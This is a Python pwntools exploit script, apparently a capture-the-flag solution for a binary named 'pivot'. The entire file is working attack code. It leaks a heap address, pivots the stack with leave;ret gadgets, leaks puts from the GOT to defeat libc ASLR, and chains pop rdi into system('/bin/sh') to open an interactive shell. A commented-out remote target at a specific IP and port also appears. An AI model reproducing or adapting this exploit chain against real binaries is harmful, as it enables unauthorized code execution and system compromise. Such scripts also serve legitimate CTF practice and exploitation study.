from pwn import *


exe = ELF("pivot")
libc = ELF("./libc.so.6")
rop = ROP(exe)

context.binary = exe

# r = remote("128.199.12.141", 7011)
r = gdb.debug("./pivot")
r.recvline()

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
LEAVE_RET = (rop.find_gadget(['leave', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

r.sendline(flat({
    8: [
    p64(POP_RDI),
    p64(exe.got['puts']),
    p64(exe.symbols['puts']),
    p64(exe.symbols['query'])
]}))
time.sleep(0.1)
heap_addr = int(next(x for x in r.recvline().decode(errors='ignore').split() if x.startswith('0x')),16)
log.info(f"heap address at {hex(heap_addr)}")


r.send(flat({
    8: [
        p64(heap_addr),
        p64(LEAVE_RET)
    ] 
}))
time.sleep(0.1)
libc.address = u64(r.recv(6).ljust(8,b'\x00')) - libc.symbols['puts'] 
log.info(f"found libc base @ {hex(libc.address)}")

r.sendline(flat({
    7: [
    p64(POP_RDI),
    p64(next(libc.search(b"/bin/sh"))),
    p64(libc.symbols['system']),
]}))
time.sleep(0.1)
# r.sendline(b"C" * 64)

r.recvline()
r.recvline()
heap_addr = int(next(x for x in r.recvline().decode(errors='ignore').split() if x.startswith('0x')),16)
log.info(f"heap address at {hex(heap_addr)}")


r.send(flat({
    8: [
        p64(heap_addr),
        p64(LEAVE_RET)
    ] 
}))
time.sleep(0.1)
# r.send(cyclic(64,n=8))
# r.sendline("lmao")
# automate inputs as necessary here

r.interactive()
